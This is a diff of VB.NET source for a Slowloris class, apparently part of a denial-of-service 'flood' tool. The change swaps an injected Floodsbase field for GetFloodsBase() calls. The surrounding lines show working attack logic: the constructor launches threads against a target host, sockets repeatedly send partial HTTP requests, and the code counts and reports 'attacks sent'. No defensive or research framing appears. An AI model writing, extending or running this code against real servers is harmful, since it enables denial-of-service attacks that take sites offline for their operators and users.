@@ -13,9 +13,8 @@ Public Class SlowLoris
     Private AttackRunning As Boolean = False
     Private attacks As Integer = 0
     Private RandomFile As Boolean
-    Private _Floodsbase As Floodsbase
-    Public Sub New(ByVal model As SlowLorisModel, ByVal Floodsbase As Floodsbase)
-        _Floodsbase = Floodsbase
+    Public Sub New(ByVal model As SlowLorisModel)
+
         If Not AttackRunning = True Then
             AttackRunning = True
             HostToAttack = model.Host
@@ -30,7 +29,7 @@ Public Class SlowLoris
 
 
             Threads = New Thread(ThreadstoUse - 1) {}
-            _Floodsbase.SetMessage("Slowloris attack")
+            GetFloodsBase().SetMessage("Slowloris attack")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -38,7 +37,7 @@ Public Class SlowLoris
             Next
 
         Else
-            _Floodsbase.SetMessage("A Slowloris Attack is Already Running on " & HostToAttack)
+            GetFloodsBase().SetMessage("A Slowloris Attack is Already Running on " & HostToAttack)
         End If
     End Sub
     Private Sub Ended()
@@ -48,7 +47,7 @@ Public Class SlowLoris
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            _Floodsbase.SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
         End If
 
@@ -63,11 +62,11 @@ Public Class SlowLoris
                 End Try
             Next
             AttackRunning = False
-            _Floodsbase.SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & attacks.ToString)
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
 
         Else
-            _Floodsbase.SetMessage("No Slowloris Attack is Running!")
+            GetFloodsBase().SetMessage("No Slowloris Attack is Running!")
         End If
     End Sub
     Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
@@ -101,7 +100,7 @@ Public Class SlowLoris
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString), SocketFlags.None)
 
                         attacks = attacks + 1
-                        _Floodsbase.Set_AttackUpStrengOnByte(attacks * HttpString.Length)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(attacks * HttpString.Length)
 
                     Next i
                     Dim j As Integer
@@ -115,7 +114,7 @@ Public Class SlowLoris
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        _Floodsbase.Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
                         socketArray(j).Close()
                     Next j
                     Continue Do
